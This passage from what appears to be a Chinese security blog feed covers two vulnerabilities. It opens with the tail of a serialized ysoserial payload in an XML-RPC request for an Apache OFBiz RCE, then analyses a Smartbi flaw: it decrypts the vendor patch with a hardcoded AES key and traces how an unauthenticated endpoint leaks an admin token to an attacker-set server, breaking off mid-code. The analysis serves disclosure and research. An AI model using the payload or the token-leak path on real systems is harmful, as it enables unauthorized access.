AAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span><span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png"></p><h2 id="0x06-修复建议"><a href="#0x06-修复建议" class="headerlink" title="0x06 修复建议"></a>0x06 修复建议</h2><p>目前官方已发布新版本以修复这个安全问题，请通过如下链接下载安全版本：</p><p><a href="https://ofbiz.apache.org/">https://ofbiz.apache.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Smartbi token泄漏致使任意登录漏洞</title>
      <link href="/smartbi-monitorservice-token-disclosure.html"/>
      <url>/smartbi-monitorservice-token-disclosure.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li><li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a><ul><li><a href="#%E8%A1%A5%E4%B8%81%E5%8C%85%E8%A7%A3%E5%AF%86">补丁包解密</a></li><li><a href="#%E8%A1%A5%E4%B8%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">补丁代码分析</a></li><li><a href="#token%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91">token处理逻辑</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E5%9C%B0%E5%9D%80">设置地址</a></li><li><a href="#token%E5%88%A9%E7%94%A8">token利用</a></li></ul></li><li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x03 漏洞利用</a></li><li><a href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x04 修复建议</a></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助探索分析、数据挖掘建模、AI 智能分析等大数据分析需求。</p><p>2023年7月28日，Smartbi官方发布安全补丁，修复了一处权限绕过漏洞。该漏洞源于监控服务中的接口对于未登录状态也提供访问，并且攻击者能够传递可控的服务器地址到其中的某些功能，这些功能会向攻击者可控的服务器泄漏token，而这个token可被用来以管理员身份登录至后台。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><ul><li>Smartbi &lt;&#x3D; V10 &amp;&amp; Smartbi !&#x3D; V9.5 &amp;&amp; 安全补丁 &lt; 2023-07-28</li></ul><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="补丁包解密"><a href="#补丁包解密" class="headerlink" title="补丁包解密"></a>补丁包解密</h3><p>下载官方提供的补丁包文件<code>patch.patches</code>，使用010 Editor工具可以判断文件类型为AES加密文件。如下使用<code>cat</code>命令进行查看，也能够判断出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> patch.patches</span><br><span class="line">n0+aJMe4W7hs6xzxE5RvhGCv5LbOMBYCfDSLnX9o7/jd1kKJekz5mNTWkLQrvG6+qi7OwYAAOBbU</span><br><span class="line">yhBYnFDbLuCShInJ9b/2YYktrClYvSbNVJwDAK+H/4+4yDfW9ugiUU7TLDwtIern5D+J8mQHliiw</span><br><span class="line">jVATE0pMPUzFDxVbZR6lV3/pPI+NqkQ33F8Vs89sFA8rpPGhxaVzkbL+CW/D3pRV1+24ANb1I579</span><br><span class="line">//jUkVteL+aJk8qYoBJz4w7PBxw2lFTedrrSzKZymhwISWdVo/oJwzF2BuX8ha+6QuOJ9uItzqNq</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>通过寻找，在SmartbiX-AugmentedDataSet-0.0.1.jar中的<code>smartbix.augmenteddataset.util</code>包中，存在<code>AESCryption</code>类，提供AES加解密功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AESCryption</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;1234567812345678&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="string">&quot;1234567812345678&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MODE</span> <span class="operator">=</span> <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">AESCryption</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">                <span class="type">SecretKeySpec</span> <span class="variable">keyspec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key.getBytes(<span class="string">&quot;utf-8&quot;</span>), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                <span class="type">IvParameterSpec</span> <span class="variable">ivspec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">                cipher.init(<span class="number">1</span>, keyspec, ivspec);</span><br><span class="line">                <span class="type">byte</span>[] encrypted = cipher.doFinal(data.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> Base64.encodeBase64String(encrypted).toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decrypt</span><span class="params">(String encrypted)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (encrypted == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] encrypted1 = Base64.decodeBase64(encrypted);</span><br><span class="line">                <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">                <span class="type">SecretKeySpec</span> <span class="variable">keyspec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key.getBytes(<span class="string">&quot;utf-8&quot;</span>), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                <span class="type">IvParameterSpec</span> <span class="variable">ivSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">                cipher.init(<span class="number">2</span>, keyspec, ivSpec);</span><br><span class="line">                <span class="type">byte</span>[] original = cipher.doFinal(encrypted1);</span><br><span class="line">                <span class="type">String</span> <span class="variable">originalString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(original, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> originalString;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，根据如上<code>key</code>和<code>iv</code>，编写Python解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_aes_file</span>(<span class="params">input_file, output_file, key=<span class="string">b&#x27;1234567812345678&#x27;</span>, iv=<span class="string">b&#x27;1234567812345678&#x27;</span></span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">        encrypted_data = f_in.read()</span><br><span class="line">        decoded_data = b64decode(encrypted_data)</span><br><span class="line">        decrypted_data = unpad(cipher.decrypt(decoded_data), AES.block_size)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        f_out.write(decrypted_data)</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;patch.patches&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to file name.&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;decrypted-&quot;</span>+args.file+<span class="string">&quot;.zip&quot;</span></span><br><span class="line"></span><br><span class="line">decrypt_aes_file(args.file, filename)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] OutPut: &quot;</span> + filename)</span><br></pre></td></tr></table></figure><p>最终解密出来的是一个zip压缩包，直接进行解压后就可以看到补丁代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mv</span> patch.patches 2023-07-28-patch.patches &amp;&amp; python deSmartBIPatch.py -f 2023-07-28-patch.patches</span><br><span class="line">[+] OutPut: decrypted-2023-07-28-patch.patches.zip</span><br><span class="line">$ unzip decrypted-2023-07-28-patch.patches.zip &amp;&amp; tree decrypted-2023-07-28-patch.patches</span><br><span class="line">decrypted-2023-07-28-patch.patches</span><br><span class="line">├── patch.patches</span><br><span class="line">└── smartbi</span><br><span class="line">    └── security</span><br><span class="line">        └── patch</span><br><span class="line">            └── impl</span><br><span class="line">                ├── AdminsPatchRule.class</span><br><span class="line">                ├── AdminsRMIServletPatchRule.class</span><br><span class="line">                ├── AssertFunctionRMIServletPatchRule.class</span><br><span class="line">                ├── BIConfigAdminsRMIServletPatchRule.class</span><br><span class="line">                ├── ChoosePathPatchRule.class</span><br><span class="line">                ├── ChoosePathRMIPatchRule.class</span><br><span class="line">                ├── EscapeErrorDetailPatchRule.class</span><br><span class="line">                ├── EscapeErrorDetailPatchRuleInternal<span class="variable">$1</span>.class</span><br><span class="line">                ├── EscapeErrorDetailPatchRuleInternal.class</span><br><span class="line">                ├── EscapeRefreshString$1<span class="variable">$1</span>.class</span><br><span class="line">                ├── EscapeRefreshString<span class="variable">$1</span>.class</span><br><span class="line">                ├── EscapeRefreshString.class</span><br><span class="line">                ├── LimitGetSelfPassword.class</span><br><span class="line">                ├── LimitGetSessionAttrPassword.class</span><br><span class="line">                ├── ListSessionsPatchRule.class</span><br><span class="line">                ├── RMIServletPatchRule.class</span><br><span class="line">                ├── RejectPatchRule.class</span><br><span class="line">                ├── RejectPatchRuleBy404.class</span><br><span class="line">                ├── RejectRMIDataConnPatchRule.class</span><br><span class="line">                ├── RejectRMIEncodeRule.class</span><br><span class="line">                ├── RejectRMIParamsStringsPatchRule.class</span><br><span class="line">                ├── RejectRMIPatchRule.class</span><br><span class="line">                ├── RejectSmartbixSetAddress.class</span><br><span class="line">                ├── RejectStubPostPatchRule.class</span><br><span class="line">                ├── RemoveLog4j2JNDIPatchRule.class</span><br><span class="line">                ├── RestrictIpPatchRule.class</span><br><span class="line">                └── WindowUnLoadingAndAttributeRule.class</span><br></pre></td></tr></table></figure><h3 id="补丁代码分析"><a href="#补丁代码分析" class="headerlink" title="补丁代码分析"></a>补丁代码分析</h3><p>不断排查，定位到本次漏洞的补丁代码位于<code>RejectSmartbixSetAddress</code>类，相关代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> smartbi.security.patch.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RejectSmartbixSetAddress</span> <span class="keyword">extends</span> <span class="title class_">PatchRule</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">patch</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">tagName</span> <span class="operator">=</span> getTagName();</span><br><span class="line">            <span class="keyword">if</span> (tagName.contains(<span class="string">&quot;SmartbiV95&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;smartbix.datamining.service.MonitorService&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getToken</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;getToken&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getToken == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码先判断了版本号是否为V95，如果是则返回0，由此可见该版本不受该漏洞影响。然后继续判断<code>smartbix.datamining.service.MonitorService</code>类中是否存在<code>getToken</code>方法，如果不存在则返回0，即不受该漏洞影响。</p><p>但若存在<code>getToken</code>方法则会返回1，此时再来查看补丁包中的<code>patch.patches</code>日志更新文件，当<code>type</code>为<code>RejectSmartbixSetAddress</code>时，存在以下<code>url</code>，这些<code>url</code>将会被拒绝访问。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;PATCH_20230728&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;desc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;修复在某种特定情况下破解用户密码和特定情况下DB2绕过判断执行命令漏洞 (Patch.20230728  @2023-07-28)&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;urls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setServiceAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setServiceAddress/&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setEngineAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setEngineAddress/&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setEngineInfo&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/smartbix/api/monitor/setEngineInfo/&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RejectSmartbixSetAddress&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="token处理逻辑"><a href="#token处理逻辑" class="headerlink" title="token处理逻辑"></a>token处理逻辑</h3><p>根据如上补丁代码分析，首先进入到<code>smartbix.datamining.service.MonitorService</code>类中，该类位于SmartbiX-DataMining-0.0.1.jar文件。</p><p>找到<code>getToken</code>方法，注解<code>@FunctionPermission(&#123;&quot;NOT_LOGIN_REQUIRED&quot;&#125;)</code>可以表明<code>/token</code>接口能被未授权访问，同时由于<code>@RequestBody</code>注解的存在，该方法接收的内容类型不能为<code>application/x-www-form-urlencoded</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/token&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@FunctionPermission(&#123;&quot;NOT_LOGIN_REQUIRED&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getToken</span><span class="params">(<span class="meta">@RequestBody</span> String type)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="built_in">this</span>.catalogService.getToken(<span class="number">10800000L</span>);</span><br><span class="line">    ComponentStateHolder.toSmartbiX();</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isNullOrEmpty(token)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> SmartbiXException.create(CommonErrorCode.NULL_POINTER_ERROR).setDetail(<span class="string">&quot;token is null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;SERVICE_NOT_STARTED&quot;</span>.equals(token)) &#123;</span><br><span class="line">        Map&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        result.put(<span class="string">&quot;token&quot;</span>, token);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;experiment&quot;</span>.equals(type)) &#123;</span><br><span class="line">            EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;service&quot;</span>.equals(type)) &#123;</span><br><span class="line">            EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;EngineApi.address(<span class="string">&quot;service-address&quot;</span>)&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ComponentStateHolder.toSmartbiX();</span><br><span class="line">        ComponentStateHolder.fromSmartbiX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上<code>getToken</code>方法中，最初先生成了一个<code>token</code>字符串，跟进<code>catalogService.getToken</code>方法，其中又调用了<code>pushLoginTokenByEngine</code>方法来生成一个管理员用户的<code>token</code>。</p><p>该<code>token</code>不为空且不为字符串<code>SERVICE_NOT_STARTED</code>，顺利进入到如下<code>else if</code>分支，此时根据<code>type</code>值是为<code>&quot;experiment&quot;</code>还是<code>&quot;service&quot;</code>，存在两种情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;SERVICE_NOT_STARTED&quot;</span>.equals(token)) &#123;</span><br><span class="line">    Map&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    result.put(<span class="string">&quot;token&quot;</span>, token);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;experiment&quot;</span>.equals(type)) &#123;</span><br><span class="line">        EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span 